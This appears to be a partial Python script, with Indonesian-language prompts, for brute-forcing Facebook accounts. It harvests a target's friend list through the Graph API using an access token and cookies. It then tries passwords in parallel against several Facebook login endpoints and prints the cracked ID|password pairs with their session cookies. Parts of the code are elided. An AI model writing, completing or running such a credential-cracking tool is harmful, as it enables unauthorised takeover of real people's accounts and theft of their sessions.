...
#Tenk Bas Ini Sc dah Ku update bang bas#
#DHANZ_XR BISMILAH DULU YAKA BIAR BERKAH#
###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
...
==========================
SALAM : _DHANZ-XR (⁠ ⁠⚈̥̥̥̥̥́⁠⌢⁠⚈̥̥̥̥̥̀⁠)
==========================

{hijo}simpel crack brute force''')
...
def menu(id):
	try:
		...
		lord_udin(f'{kun}cookies telah kadaluarsa ster')
		waktu(4)
		login_men()
	os.system('clear')
	banner()
	print(f'{xxx}｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡')
	print(f'{xxx} ===> BILA INGIN CRACK PUBLIK KETIK okeh/ok  Ngerti?')
	helpbas = input(f'{xxx} •••••©® : ')
	if helpbas in ['okeh','ok']:
		nge_krek()
	else:
		lord_udin(f'{kun} ♦ yang bener lah Jancokk ')
...
def nge_krek():
	try:
		...
		lord_udin(f'{ung}cookies telah kadaluarsa ster')
		exit()
	print(f'{xxx}｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡')
	idnyanih = input(f' ♦ Masukan id : ')
	try:
		ambilid = requests.get('https://graph.facebook.com/v1.0/'+idnyanih+'?fields=friends.limit(5001)&access_token='+tokenkufb[0],cookies={'cookie': cok}).json()
		...
		lord_udin(f'{mer} Cek koneksi terputus')
		exit()
	except (KeyError,IOError):
		lord_udin(f'{kun} Nu Bener teman tidak publik')
		exit()
...
def atur_dulu():
	...
	if aturid in ['1','01']:
		...
		lordudin(f'{ung}˚ ༘✶ ⋆✓˚ ⁀➷yang bener lah ster')
		exit()
...
def passwrd():
	...
	with prog:
		with tred(max_workers=30) as lord_udin:
			for yuzong in id2:
				...
				if 'mobile' in udin:
					lord_udin.submit(crackmobile,idf,pwv)
				elif 'free' in udin:
					lord_udin.submit(crackfree,idf,pwv)
				elif 'mbasic' in udin:
					lord_udin.submit(crackmbasic,idf,pwv)
				else:
					lord_udin.submit(crackmbasic,idf,pwv)
		print(f'{xxx}─────────────────────────────')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r OK: {hijo}{idf}|{pw}\n{xxx} KUKIS : {hijo}{kuki}{xxx}')
